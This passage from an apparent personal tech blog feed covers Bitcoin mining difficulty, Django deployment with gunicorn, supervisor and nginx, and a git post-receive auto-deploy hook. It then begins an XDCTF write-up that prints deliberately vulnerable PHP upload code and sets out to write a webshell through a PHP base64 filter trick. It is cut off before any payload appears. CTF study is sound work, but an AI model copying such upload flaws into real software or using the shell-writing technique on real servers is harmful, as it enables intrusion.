区块的产生——挖矿</h1><p>在了解了区块本身的结构后，我们来说一说区块是如何生成的。经过上面的介绍，我们知道区块链本身就是一个数据库，用于记录一些信息，而生成这个数据库从而产生新区块的过程就是挖矿。</p><p>由于区块链网络本身是一个分布式的数据库，其必定存在节点更新的工作，为了保证所有节点可以同步的更新数据，新区块的添加速度必定不能太快，因为过快的增加区块会影响其他同步较慢节点区块的生成。</p><p>中本聪在设计区块链时也考虑到了这个情况，他在设计比特币系统的时候设计了每10分钟产生一个新的区块，在生成区块的算法上，他使用了POW算法的思路，这个算法就是我们常说的<strong>工作量证明算法</strong>，这个算法简单来说就是为了防止资源滥用，在每个节点生成新区块前，首先需要做一定量的工作，生成工作量证明，确保节点的正常。</p><p>在前面我们已经介绍过了区块头的结构，在区块头结构中有一个Nonce字段，这个字段是也就是工作量证明算法需要做的工作。在其他字段值不变的情况下，通过不断的更新Nonce的值来改变区块头这个结构的整体哈希值。</p><p>如何证明该节点的工作是有效的呢？在区块头结构中还有一个Target值，只有当你找到一个Nonce值使得整个结构算出的哈希值小于Target值，才算成功，才能生成新的区块。</p><h1 id="0x04-为什么说挖矿很难"><a href="#0x04-为什么说挖矿很难" class="headerlink" title="0x04 为什么说挖矿很难"></a>0x04 为什么说挖矿很难</h1><p>根据以上的介绍，可以将挖矿理解为计算Nonce值，使得当前区块头的哈希值小于Target值。这个哈希值需要进行相当复杂的计算，接下来就深入聊一下为什么说挖矿很难。</p><h2 id="1-难度系数"><a href="#1-难度系数" class="headerlink" title="1. 难度系数"></a>1. 难度系数</h2><p><strong>难度系数（difficulty）是指与上一次发现一个区块时相比，现在发现一个区块的困难程度。</strong></p><p>在区块头中都会包含一个难度系数（difficulty），这个值决定了计算哈希的难度。难度系数在区块中并不记录，而是一个浮点数，其公式如下：</p><p>$$difficulty=\cfrac{difficulty_1_target}{currentTarget}$$</p><p><code>difficulty_1_target</code>是一个非常大的常数。表示矿池挖矿最大难度，其数值为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00000000FFFF0000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>也就是：</p><p>$$diffuculty_1_taget=0xffff*2^{208}$$</p><p>难度系数是如何存储在区块中的呢？每个区块会被存储为一个经过压缩后的target，target是使用十六进制表示的。这个target是能够使用预定义的公式推断的，用一个具体的例子来说明过程。</p><p>如果区块bits记录为<code>0x1b0404cb</code>，在计算时，后面3个字节<code>0x0404cb</code>为底，前面的1字节<code>0x1b</code>表示次方数，因此这个16进制的target是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0404cb * 2 ** (8*(0x1b-3)) = 0x00000000000404CB000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure><p>我们来理一下压缩的过程：</p><ol><li>将数字转换为256进制数</li><li>如果第一位数字大于127即（0x7f），则在前面添加0</li><li>压缩结果中的第一位存放该256进制数的位数</li><li>后面三个数存放该256进制数的前三位，如果不足三位，则在后面补0</li></ol><p>举个例子，如果将1000压缩，先转换成256进制数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1000=0x03 * 256 + 0xe8 * 1</span><br></pre></td></tr></table></figure><p>由两个数字构成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">03      e8</span><br></pre></td></tr></table></figure><p><code>03</code>未超过0x7f，前面不需要添0，但是长度为两位低于三位，需要在后面补0，最终表示为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0203e800</span><br></pre></td></tr></table></figure><p>根据公式可以看到当<code>current_target=0</code>时<code>diffculty</code>无穷大，但是实际情况是最大难度值接近$2^{265-32}$，同理难度值的最小值为1。</p><h2 id="2-难度系数的动态调节"><a href="#2-难度系数的动态调节" class="headerlink" title="2. 难度系数的动态调节"></a>2. 难度系数的动态调节</h2><p>中本聪在设计区块链时规定了每10分钟生成一个新的区块，并且每2016个区块(每2周<code>6*24*7*2=2016</code>)动态更新一次难度系数。如果生成前面的2016个区块花费了超过2周的时间，难度会根据比例来降低难度系数，同理，如果少于2周时间，则会根据比例上调难度系数。</p><p>难度系数越调越高，根据难度计算公式，我们能知道目标值会越来越小，所以挖矿越来越难。</p><h2 id="3-网络算力（hash-rate）和给定难度的相关性"><a href="#3-网络算力（hash-rate）和给定难度的相关性" class="headerlink" title="3. 网络算力（hash rate）和给定难度的相关性"></a>3. 网络算力（hash rate）和给定难度的相关性</h2><p>网络算力，表示根据难度值要计算多少次才能找到一个随机数使得区块哈希值低于目标值。由当前目标值<code>currentTarget</code>决定当前难度值。假设当前难度为D（十进制），根据难度公式得到难度D的偏移为：</p><p>$$currentTarget=\cfrac{difficulty_1_target}{D}=\cfrac{0xffff*2^{208}}{D}$$</p><p>我们都知道区块计算出的哈希值是一个256bit的值，也就是说在难度D下，如果想要生成新的区块，大约要计算的哈希个数为：</p><p>$$\cfrac{D}{0xffff<em>2^{208}}</em>2^{256}=\cfrac{D<em>2^{48}}{0xffff}=D</em>2^{32}$$</p><p>也就是目前难度计算速度要求在10分钟内找到，也就是说网络算力最低必须是：</p><p>$$\cfrac{D*2^{32}}{600}$$</p><p>简单来算的话，当难度值D=1，需要每秒计算7158278次哈希，即7.15 Mhahs/s。</p><h2 id="4-如何估算产生一个块的时间"><a href="#4-如何估算产生一个块的时间" class="headerlink" title="4. 如何估算产生一个块的时间"></a>4. 如何估算产生一个块的时间</h2><p>下面的公式可以计算产生一个块的平均值：</p><p>$$time=\cfrac{difficulty * 2^{32}}{hashrate}$$</p><p><code>difficulty</code>是当前难度，<code>hashrate</code>是每秒矿机计算的哈希个数（算力），<code>time</code>是挖掘到新区块的平均间隔时间。</p><p>附一个算力换算公式：</p><ul><li>1 KHash/s = 1000 Hash/s</li><li>1 MHash/s = 1000 KHash/s</li><li>1 GHash/s = 1000 MHash/s</li><li>1 THash/s = 1000 GHash/s</li><li>1 PHash/s = 1000 THash/s</li></ul><p>了解一下现在的难度：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15289631860281.jpg" alt=""></p><p>普通计算机（i7 6700k + 16g内存）算力差不多是1.8GH/s，我按2GH/s来算：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15290792625540.jpg" alt=""></p><p>差不多是要122784365天。</p><h1 id="0x05-区块链的分叉"><a href="#0x05-区块链的分叉" class="headerlink" title="0x05 区块链的分叉"></a>0x05 区块链的分叉</h1><p>在区块链中可能出现同时有两个区块加入，而且其都是连接着前一个区块的新区块，这样就可能形成分叉，这个时候区块链会记录各个分叉的情况，看哪个分叉后面首先达到6个新区块，就将哪个分叉并入区块链中，并将其他的分叉抛弃。</p><h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>区块链作为去中心化的工具是一个非常新颖的领域，同时其所存储的数据是较为可靠的，但是它比较消耗能源，并且效率低下，所以区块链目前适用的场景非常有限。目前最大的应用场景就是虚拟货币。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-什么是区块链&quot;&gt;&lt;a href=&quot;#0x00-什么是区块链&quot; class=&quot;headerlink&quot; title=&quot;0x00 什么是区块链&quot;&gt;&lt;/a&gt;0x00 什么是区块链&lt;/h1&gt;&lt;p&gt;简单一句话就可以回答：&lt;strong&gt;区块链是一种特殊的分布式数据库&lt;/strong&gt;。&lt;/p&gt;
    
    </summary>
    
      <category term="blockchain" scheme="https://lucifaer.com/categories/blockchain/"/>
    
    
      <category term="blockchain" scheme="https://lucifaer.com/tags/blockchain/"/>
    
  </entry>
  
  <entry>
    <title>部署Django</title>
    <link href="https://lucifaer.com/2018/03/02/%E9%83%A8%E7%BD%B2Django/"/>
    <id>https://lucifaer.com/2018/03/02/部署Django/</id>
    <published>2018-03-02T09:44:44.000Z</published>
    <updated>2018-11-29T09:27:55.580Z</updated>
    
    <content type="html"><![CDATA[<p>接上一篇。</p><a id="more"></a><p>这边说一句，git hooks配合supervisor可以完成远程代码实时更新，对于开发人员来说是非常方便的开发环境。当然对于我的wiki来说，我会随时添加一些新的功能，需要频繁的修改代码，git hooks+supervisor可以完美的符合我的需求。</p><h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>在官方文档中搜索<code>deploy</code>官方文档会告诉你，Django私有的部署平台是<code>WSGI</code>，而官方对于<code>WSGI</code>服务的部署给出了以下几个方法，我们这次试用的是<code>gunicorn</code>。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15199632384352.jpg" alt=""></p><h1 id="0x01-Get-Start"><a href="#0x01-Get-Start" class="headerlink" title="0x01 Get Start"></a>0x01 Get Start</h1><p>首先安装<code>gunicorn</code>包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install gunicorn</span><br></pre></td></tr></table></figure><p>接下来检查是否存在<code>&lt;project_name&gt;/wsgi.py</code>文件（如果试用命令<code>startproject</code>来创建的项目，会默认存在）。若存在，就可以在项目根目录来执行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gunicorn myproject.wsgi</span><br></pre></td></tr></table></figure><p>访问<code>127.0.0.1:8000</code>来查看服务是否正常，如果没问题，我们来写个shell脚本，方便我们利用<code>gunicorn</code>来启动服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">NAME=&quot;D0g3_wiki&quot;                                  # Name of the application</span><br><span class="line">DJANGODIR=/home/lucifaer/D0g3_wiki             # Django project directory</span><br><span class="line">SOCKFILE=/home/lucifaer/D0g3_wiki/run/gunicorn.sock  # we will communicte using this unix socket</span><br><span class="line">USER=lucifaer                                     # the user to run as</span><br><span class="line">GROUP=lucifaer                                 # the group to run as</span><br><span class="line">NUM_WORKERS=3                                     # how many worker processes should Gunicorn spawn</span><br><span class="line">DJANGO_SETTINGS_MODULE=D0g3_wiki.settings             # which settings file should Django use</span><br><span class="line">DJANGO_WSGI_MODULE=D0g3_wiki.wsgi                     # WSGI module name</span><br><span class="line"></span><br><span class="line">echo &quot;Starting $NAME as `whoami`&quot;</span><br><span class="line"></span><br><span class="line"># Activate the virtual environment</span><br><span class="line">cd $DJANGODIR</span><br><span class="line">export DJANGO_SETTINGS_MODULE=$DJANGO_SETTINGS_MODULE</span><br><span class="line">export PYTHONPATH=$DJANGODIR:$PYTHONPATH</span><br><span class="line">export PATH=/srv/http/.gem/ruby/2.4.0/bin:$PATH</span><br><span class="line"># Create the run directory if it doesn&apos;t exist</span><br><span class="line">RUNDIR=$(dirname $SOCKFILE)</span><br><span class="line">test -d $RUNDIR || mkdir -p $RUNDIR</span><br><span class="line"></span><br><span class="line"># Start your Django Unicorn</span><br><span class="line"># Programs meant to be run under supervisor should not daemonize themselves (do not use --daemon)</span><br><span class="line">exec /home/lucifaer/.pyenv/versions/3.6.3/bin/gunicorn -b 0.0.0.0:8000 $&#123;DJANGO_WSGI_MODULE&#125;:application \</span><br><span class="line">  --name $NAME \</span><br><span class="line">  --workers $NUM_WORKERS \</span><br><span class="line">  --user=$USER --group=$GROUP \</span><br><span class="line">#  --bind=unix:$SOCKFILE \</span><br><span class="line">  --log-level=debug \</span><br><span class="line">  --reload \</span><br><span class="line">  --log-file=-</span><br></pre></td></tr></table></figure><p>PS：这是我的配置文件，请根据自己的目录修改变量。</p><p>之后更改该文件的权限为可执行。</p><p>最后一步就是把我们Django项目中的settings.py做如下更改：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15199763187343.jpg" alt=""></p><p>即关闭debug模式，并允许所有的host访问。</p><p>以上就完成了最基本的Django的部署，接下来我们要设置supervisor，来将这个进程设置为守护进程。</p><h1 id="0x02-Supervisor"><a href="#0x02-Supervisor" class="headerlink" title="0x02 Supervisor"></a>0x02 Supervisor</h1><p>Superviosr是一个进程监管的工具。简而言之，Superviosr可以保证你的程序在服务器开机时自动启动以及程序意外终止时重新启动。通过下面的命令即可安装:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install supervisor</span><br></pre></td></tr></table></figure><p>接下来就是配置Supervisor的配置文件，以达成监管目的。一般配置文件都放在<code>/etc/supervisor/conf.d</code>目录下。我们可以在该目录下创建自定义的配置文件，下面是我的配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[program:D0g3_wiki]</span><br><span class="line">command = /home/lucifaer/D0g3_wiki/gunicorn_start ; Command to start app</span><br><span class="line">directory = /home/lucifaer/D0g3_wiki/</span><br><span class="line">user = lucifaer ; User to run as</span><br><span class="line">stdout_logfile = /home/lucifaer/logs/gunicorn_supervisor.log ; Where to write log messages</span><br><span class="line">redirect_stderr = true ; Save stderr in the same log</span><br><span class="line">environment=LANG=en_US.UTF-8,LC_ALL=en_US.UTF-8 ; Set UTF-8 as default encoding</span><br><span class="line">autostart=true</span><br><span class="line">autorestart=true</span><br></pre></td></tr></table></figure><p>日志文件需要手动创建：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ touch /home/lucifaer/logs/gunicorn_supervisor.log</span><br></pre></td></tr></table></figure><p>接下来用<code>supervisorctl</code>来启动设置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ sudo supervisorctl reread </span><br><span class="line">D0g3_wiki: available </span><br><span class="line">$ sudo supervisorctl update </span><br><span class="line">D0g3_wiki: added process group</span><br></pre></td></tr></table></figure><p>之后就可以开启进程了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo supervisorctl start D0g3_wiki</span><br></pre></td></tr></table></figure><h1 id="0x03-Nginx"><a href="#0x03-Nginx" class="headerlink" title="0x03 Nginx"></a>0x03 Nginx</h1><p>Nginx安装步骤就省略了，不要太简单。</p><p>之后我们需要的就是为Django项目创建一个虚拟sever配置。</p><p>每个Nginx的虚拟sever都由<code>/etc/nginx/sites-available</code>路径下的一个配置文件来表示，而将其链接到的<code>/etc/nginx/sites-enabled</code>路径下则可以启用对应的站点。</p><p>我们在<code>/etc/nginx/sites-available</code>为Django项目创建一个配置文件，内容如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">upstream D0g3_wiki_app_server &#123;</span><br><span class="line"># fail_timeout=0 means we always retry an upstream even if it failed</span><br><span class="line"># to return a good HTTP response (in case the Unicorn master nukes a</span><br><span class="line"># single worker for timing out).</span><br><span class="line"></span><br><span class="line">server unix:/home/lucifaer/D0g3_wiki/D0g3_wiki/run/gunicorn.sock fail_timeout=0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line"></span><br><span class="line">listen 80;</span><br><span class="line">server_name example.com;</span><br><span class="line"></span><br><span class="line">client_max_body_size 4G;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">location /static/ &#123;</span><br><span class="line">alias /home/lucifaer/D0g3_wiki/static/;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">location / &#123;</span><br><span class="line"># an HTTP header important enough to have its own Wikipedia entry:</span><br><span class="line"># http://en.wikipedia.org/wiki/X-Forwarded-For</span><br><span class="line">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line"></span><br><span class="line"># enable this if and only if you use HTTPS, this helps Rack</span><br><span class="line"># set the proper protocol for doing redirects:</span><br><span class="line"># proxy_set_header X-Forwarded-Proto https;</span><br><span class="line"></span><br><span class="line"># pass the Host: header from the client right along so redirects</span><br><span class="line"># can be set properly within the Rack application</span><br><span class="line">proxy_set_header Host $http_host;</span><br><span class="line"></span><br><span class="line"># we don&apos;t want nginx trying to do something clever with</span><br><span class="line"># redirects, we set the Host: header above already.</span><br><span class="line">proxy_redirect off;</span><br><span class="line"></span><br><span class="line"># set &quot;proxy_buffering off&quot; *only* for Rainbows! when doing</span><br><span class="line"># Comet/long-poll stuff. It&apos;s also safe to set if you&apos;re</span><br><span class="line"># using only serving fast clients with Unicorn + nginx.</span><br><span class="line"># Otherwise you _want_ nginx to buffer responses to slow</span><br><span class="line"># clients, really.</span><br><span class="line"># proxy_buffering off;</span><br><span class="line"></span><br><span class="line"># Try to serve static files from nginx, no point in making an</span><br><span class="line"># *application* server like Unicorn/Rainbows! serve static files.</span><br><span class="line">if (!-f $request_filename) &#123;</span><br><span class="line">proxy_pass 你的代理ip，也就是你的ip(或域名)+8000端口;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># Error pages</span><br><span class="line">error_page 500 502 503 504 /500.html;</span><br><span class="line">location = /500.html &#123;</span><br><span class="line">root /home/lucifaer/D0g3_wiki/static/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将这个文件链接到<code>site_enabled</code>目录下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo ln -s /etc/nginx/sites-available/D0g3_wiki.conf /etc/nginx/sites-enabled/D0g3_wiki.conf</span><br></pre></td></tr></table></figure><p>然后重启Nginx就好了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo service nginx restart</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;接上一篇。&lt;/p&gt;
    
    </summary>
    
      <category term="环境部署" scheme="https://lucifaer.com/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="环境部署" scheme="https://lucifaer.com/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>Git Hooks实现项目的自动部署</title>
    <link href="https://lucifaer.com/2018/02/28/Git%20Hooks%E5%AE%9E%E7%8E%B0%E9%A1%B9%E7%9B%AE%E7%9A%84%E8%87%AA%E5%8A%A8%E9%83%A8%E7%BD%B2/"/>
    <id>https://lucifaer.com/2018/02/28/Git Hooks实现项目的自动部署/</id>
    <published>2018-02-28T02:56:44.000Z</published>
    <updated>2018-11-29T09:42:36.640Z</updated>
    
    <content type="html"><![CDATA[<p>最近把自己的wiki重新更新了一下版本，正好以前的服务器到期，把新版本的wiki迁移到新的服务器上，顺手把之前配置的代码自动部署的过程记录下来。</p><p>实现项目的自动部署，最简便的方法就是利用<code>git hooks</code>这个方法。</p><a id="more"></a><h1 id="0x00-什么是git-hooks"><a href="#0x00-什么是git-hooks" class="headerlink" title="0x00 什么是git hooks"></a>0x00 什么是git hooks</h1><p>简单来理解一下，就是一个可以hook<code>git</code>操作，根据<code>git</code>操作来处理之后动作的触发式自定义脚本。</p><p><code>git hooks</code>有两种类型的钩子：客户端和服务端。</p><p>客户端的钩子有：</p><ol><li><code>pre-commit</code> 钩子在commit前运行</li><li><code>prepare-commit-msg</code> 钩子在启动提交信息编辑器前，默认信息被创建后运行。</li><li><code>post-commit</code> 钩子在commit过程完成后运行，对应着的是<code>git commit</code>之后的操作</li><li><code>applypatch-msg</code> 该钩子将提交信息进行格式化规范，或修正格式错误</li><li><code>pre-applypatch</code> 在<code>git am</code>期间运行</li><li><code>post-applypatch</code> 运行于提交后产生，是在<code>git am</code>运行期间最后被调用的钩子</li><li><code>pre-rewrite</code> 钩子被那些会替换提交记录的命令调用</li><li><code>post-checkout</code> 在<code>git checkout</code>成功运行后调用</li><li><code>post-merge</code> 在<code>git merge</code>成功运行后调用</li><li><code>pre-push</code> 在<code>git push</code>运行期间，更新了远程引用但尚未传送对象时被调用</li><li><code>pre-auto-gc</code> 在垃圾回收前被调用</li></ol><p>服务端的钩子有：</p><ol><li><code>pre-receive</code> 处理来自客户端的推送操作时最先被调用</li><li><code>update</code> 它会为每一个准备更新的分支各运行一次</li><li><code>post-receive</code> 在整个过程完成以后运行，可以用来更新其他系统服务或者通知用户</li></ol><h1 id="0x01-使用git-hooks"><a href="#0x01-使用git-hooks" class="headerlink" title="0x01 使用git hooks"></a>0x01 使用git hooks</h1><p>所有的钩子脚本都存放在<code>.git/hooks</code>目录中。当使用<code>git init</code>初始化一个新仓库时，Git默认会子啊这个目录中放置一些示例脚本。这些示例的名字都是以<code>.simple</code>结尾的，如果你想启用他们，首先要移除该后缀，或者重新创建该文件。</p><h2 id="服务端部署"><a href="#服务端部署" class="headerlink" title="服务端部署"></a>服务端部署</h2><p>在服务端部署远程仓库，使用的是<code>git init --bare</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir D0g3_wiki.git</span><br><span class="line">$ cd D0g3_wiki.git/</span><br><span class="line">$ git init --bare</span><br></pre></td></tr></table></figure><p>效果如图：</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15197850712206.jpg" alt=""></p><p>之后需要我们要在<code>/hooks/</code>下创建<code>post-receive</code>，并写一段shell脚本来自定义我们需要<code>post-receive</code>钩子完成的自定义任务：</p><p>post-receive</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">GIT_REPO=/root/D0g3_wiki.git</span><br><span class="line">TMP_GIT_CLONE=/tmp/D0g3_wiki</span><br><span class="line">PUBLIC_WWW=/home/lucifaer</span><br><span class="line"></span><br><span class="line">echo &quot;init receive&quot;</span><br><span class="line">rm -rf $TMP_GIT_CLONE</span><br><span class="line">if [ -d $PUBLIC_WWW ]; then</span><br><span class="line">    mkdir -p $PUBLIC_WWW</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">git clone $GIT_REPO $TMP_GIT_CLONE</span><br><span class="line"># sudo rm -rf /srv/http/hack_web/hack_web</span><br><span class="line"># sudo cp -r $TMP_GIT_CLONE/hack_web $PUBLIC_WWW</span><br><span class="line">#if [[ $EUID -eq 0 ]]; then</span><br><span class="line">rsync -av $TMP_GIT_CLONE $PUBLIC_WWW</span><br><span class="line">chown -R lucifaer:lucifaer $PUBLIC_WWW</span><br><span class="line">#fi</span><br><span class="line">rm -rf $TMP_GIT_CLONE</span><br></pre></td></tr></table></figure><p>这里是利用了<code>rsync</code>命令来完成远程数据同步，并设定了同步目录为<code>/home/lucifaer</code>。</p><p>完成了shell脚本的编辑后，给该脚本添加可执行权限：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ chmod +x post-receive</span><br></pre></td></tr></table></figure><p>至此完成了服务端的部署。</p><h2 id="客户端部署"><a href="#客户端部署" class="headerlink" title="客户端部署"></a>客户端部署</h2><p>客户端并不需要特别的部署什么样的环境，只需要将需要给需要同步的项目建立仓库，并设置remote源就好了。</p><p>比如我要将本地的<code>secspider</code>项目同步到服务端：</p><p>首先给该项目建立本地仓库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ cd secspider</span><br><span class="line">$ git init .</span><br><span class="line">$ git add .</span><br><span class="line">$ git commit -m &quot;test git hooks&quot;</span><br></pre></td></tr></table></figure><p>之后添加remote源：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git remote add nick_name user@ip:/gitrepo_dir</span><br><span class="line">$ git push nick_name master</span><br></pre></td></tr></table></figure><p>这里的<code>nick_name、user、ip</code>设置成自己的名字。</p><p>便同步成功了。</p><p><img src="http://image-lucifaer.test.upcdn.net/2018/11/29/15197866160106.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近把自己的wiki重新更新了一下版本，正好以前的服务器到期，把新版本的wiki迁移到新的服务器上，顺手把之前配置的代码自动部署的过程记录下来。&lt;/p&gt;
&lt;p&gt;实现项目的自动部署，最简便的方法就是利用&lt;code&gt;git hooks&lt;/code&gt;这个方法。&lt;/p&gt;
    
    </summary>
    
      <category term="环境部署" scheme="https://lucifaer.com/categories/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
    
      <category term="Git" scheme="https://lucifaer.com/tags/Git/"/>
    
      <category term="环境部署" scheme="https://lucifaer.com/tags/%E7%8E%AF%E5%A2%83%E9%83%A8%E7%BD%B2/"/>
    
  </entry>
  
  <entry>
    <title>XDCTF Upload 引发出来的一个新思路</title>
    <link href="https://lucifaer.com/2017/10/09/XDCTF%20Upload%20%E5%BC%95%E5%8F%91%E5%87%BA%E6%9D%A5%E7%9A%84%E4%B8%80%E4%B8%AA%E6%96%B0%E6%80%9D%E8%B7%AF/"/>
    <id>https://lucifaer.com/2017/10/09/XDCTF Upload 引发出来的一个新思路/</id>
    <published>2017-10-09T10:31:09.000Z</published>
    <updated>2018-11-29T09:33:47.527Z</updated>
    
    <content type="html"><![CDATA[<p>在十一的XDCTF中有一道Upload题引出的如何通过固定的几个字符，利用php伪协议中的<code>convert.base64-encode</code>来写shell。</p><a id="more"></a><h1 id="0x00-一道题引出的话题"><a href="#0x00-一道题引出的话题" class="headerlink" title="0x00 一道题引出的话题"></a>0x00 一道题引出的话题</h1><p>我们首先抛砖引玉，来看一下这道题的关键代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_FILES[file]) &amp;&amp; $_FILES[file][<span class="string">'size'</span>] &lt; <span class="number">4</span> ** <span class="number">8</span>) &#123;</span><br><span class="line">$d = <span class="string">"./tmp/"</span> . md5(session_id());</span><br><span class="line">@mkdir($d);</span><br><span class="line">$b = <span class="string">"$d/"</span> . pathinfo($_FILES[file][name], <span class="number">8</span>);</span><br><span class="line">file_put_contents($b, preg_replace(<span class="string">'/[^acgt]/is'</span>, <span class="string">''</span>, file_get_contents($_FILES[file][tmp . <span class="string">"_name"</span>])));</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span 